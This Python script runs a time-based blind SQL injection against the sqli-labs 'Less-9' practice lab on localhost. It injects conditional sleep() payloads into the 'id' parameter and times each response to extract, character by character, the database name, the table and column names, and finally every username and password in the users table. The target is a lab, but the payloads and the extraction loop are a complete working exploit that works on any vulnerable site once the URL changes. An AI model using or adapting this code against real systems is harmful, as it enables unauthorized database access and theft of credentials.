#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *


def def_handler(sig,frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)


signal.signal(signal.SIGINT, def_handler)

main_url= "http://localhost/sqli-labs-php7/Less-9"
characters=string.printable

def makeSQLI():
	p1= log.progress("Fuerza bruta")
	p1.status("Iniciando proceso de fuerza bruta")

	time.sleep(2)	

	p2=log.progress("Datos extraidos")

	extracted_info = ""

	for position in range(1, 150):
		for character in range(33,126):
# ESto para la base de datos
#			sqli_url = main_url + "?id=1' and if(ascii(substring(database(),%d,1))=%d,sleep(0.35),1)-- -" % (position,character)
#Esto para las tablas
#                        sqli_url = main_url + "?id=1' and if(ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema='security'),%d,1))=%d,sleep(0.35),0)-- -" % (position,character)
#Esto para las columnas
#                        sqli_url = main_url + "?id=1' and if(ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),%d,1))=%d,sleep(0.35),1)-- -" % (position,character)
#Esto para los datos
                        sqli_url = main_url + "?id=1' and if(ascii(substring((select group_concat(username,0x3a,password) from security.users),%d,1))=%d,sleep(0.35),1)-- -" % (position,character)
                        p1.status(sqli_url)

                        time_start=time.time()
			
                        r=requests.get(sqli_url)

                        time_end=time.time()

                        if time_end-time_start > 0.35:
                                extracted_info += chr(character)
                                p2.status(extracted_info)			
                                break

if  __name__=='__main__':
	makeSQLI()



